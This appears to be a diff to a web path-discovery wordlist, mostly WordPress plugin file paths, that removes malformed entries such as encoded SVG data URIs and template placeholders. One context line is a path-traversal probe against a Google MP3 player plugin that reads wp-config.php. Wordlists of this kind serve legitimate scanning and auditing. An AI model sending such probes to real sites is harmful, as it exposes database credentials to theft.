-wp-content/pluginse-events-calendar/common/src/css/%22data:image/svg+xml;charset=utf-8,%3Csvg%20width='92'%20height='92'%20xmlns='http:/www.w3.org/2000/svg'%3E%3Cg%20fill='none'%3E%3Cg%20stroke='%23141827'%20stroke-width='2.5'%20transform='translate(2%202
 wp-content/pluginse-events-calendar/common/src/js/underscore-after.js
 wp-content/pluginse-events-calendar/common/src/js/underscore-before.js
 wp-content/pluginse-events-calendar/common/vendor/tribe-select2/select2x2.png
@@ -16293,8 +16165,6 @@ wp-content/pluginseia-post-slider/images/black-sa7245f9ffa.png
 wp-content/pluginseia-post-slider/images/buttons-black-s0d3baf772a.png
 wp-content/pluginseia-post-slider/js/jquery.hammer-full.min.map
 wp-content/plugins/elementor/assets/
-wp-content/plugins/elementor/assets/css/%22data:image/svg+xml;charset=utf-8,%3Csvg%20viewBox='0%200%20120%20120'%20xmlns='http:/www.w3.org/2000/svg'%20xmlns:xlink='http:/www.w3.org/1999/xlink'%3E%3Cdefs%3E%3Cpath%20id='a'%20stroke='%236c6c6c'%20stroke-width='11'%20stroke-linecap='round'%20d='M60%207v20'/%3E%3C/defs%3E%3Cuse%20xlink:href='%23a'%20opacity='.27'/%3E%3Cuse%20xlink:href='%23a'%20opacity='.27'%20transform='rotate(30%2060%2060
-wp-content/plugins/elementor/assets/css/%22data:image/svg+xml;charset=utf-8,%3Csvg%20viewBox='0%200%20120%20120'%20xmlns='http:/www.w3.org/2000/svg'%20xmlns:xlink='http:/www.w3.org/1999/xlink'%3E%3Cdefs%3E%3Cpath%20id='a'%20stroke='%23fff'%20stroke-width='11'%20stroke-linecap='round'%20d='M60%207v20'/%3E%3C/defs%3E%3Cuse%20xlink:href='%23a'%20opacity='.27'/%3E%3Cuse%20xlink:href='%23a'%20opacity='.27'%20transform='rotate(30%2060%2060
 wp-content/plugins/elementor/assets/css/frontend-msie.min.css
 wp-content/plugins/elementor/assets/images/placeholder.png
 wp-content/plugins/elementor/assets/lib/eicons/fonts/eicons.eot
@@ -16864,7 +16734,6 @@ wp-content/plugins/google-document-embedder/~view.php
 wp-content/plugins/google-document-embedder/view.php
 wp-content/plugins/google-mp3-audio-player/direct_download.php
 wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php
-wp-content/plugins/google-sitemap-generator/%7B$itemURL%7D
 wp-content/plugins/google-sitemap-generator/sitemap-core.php
 wp-content/plugins/google-sitemap-generator/sitemaps.org
 wp-content/plugins/google-sitemap-generator/sitemap.xsl
@@ -17811,7 +17680,6 @@ wp-content/plugins/podpress/images/vpreview_center.png
 wp-content/plugins/podpress/players/
 wp-content/plugins/podpress/podpress.css
 wp-content/plugins/podpress/podpress.js
-wp-content/plugins/podpress/%s
 wp-content/plugins/podpress/type=
 wp-content/plugins/podpress/width=
 wp-content/plugins/poll-wp/JS/fonts/fontawesome-webfont.eot
@@ -17934,7 +17802,6 @@ wp-content/plugins/quiz-master-next/css/images/ui-icons_6da8d5_256x240.png
 wp-content/plugins/quiz-master-next/css/images/ui-icons_cd0a0a_256x240.png
 wp-content/plugins/quiz-master-next/css/images/ui-icons_d8e7f3_256x240.png
 wp-content/plugins/quiz-master-next/css/images/ui-icons_f9bd01_256x240.png
-wp-content/plugins/quote-comments/comment-%27+postid+%27
 wp-content/plugins/r9-flexi-ot/assets/favicon.ico
 wp-content/plugins/r9-flexi-ot/assets/frame4a.svg
 wp-content/plugins/r9-flexi-ot/assets/frame4b.svg
@@ -18145,7 +18012,6 @@ wp-content/plugins/rv-editor/library/fonts/fontawesome-webfont.ttf
 wp-content/plugins/rv-editor/library/fonts/fontawesome-webfont.woff
 wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php
 wp-content/plugins/s3-video/views/video-management/preview-video.php
-wp-content/plugins/sam-images/Toms%20Ad.jpg
 wp-content/plugins/saml-20-single-sign-on-master/readme.txt
 wp-content/plugins/sam-pro-free/sam-pro-ajax-admin.php
 wp-content/plugins/sassy-social-share/images/close.png
@@ -19207,7 +19073,6 @@ wp-content/plugins/ultimate-social-media-plus/images/visit_icons/Visit_us_google
 wp-content/plugins/ultimate-social-media-plus/images/visit_icons/Visit_us_twitter/icon_Visit_us_en_US.png
 wp-content/plugins/ultimate-social-media-plus/images/visit_icons/youtube.png
 wp-content/plugins/UltimateTagWarrior/ultimate-tag-warrior-ajax-js.php
-wp-content/plugins/UltimateTagWarrior/ultimate-tag-warrior-ajax-js.php%
 wp-content/plugins/UltimateTagWarrior/ultimate-tag-warrior-js.php
 wp-content/plugins/Ultimate_VC_Addons/assets/css/fonts/ult-silk.eot
 wp-content/plugins/Ultimate_VC_Addons/assets/css/fonts/ult-silk.svg
@@ -20742,7 +20607,6 @@ xx.php
 xxsssseee
 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.pl
 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.plx
-xy_%E5%BC%80%E5%A5%96%E5%99%A8/config.js
 y
 y000000000000.cfg
 y2ekghed.pl
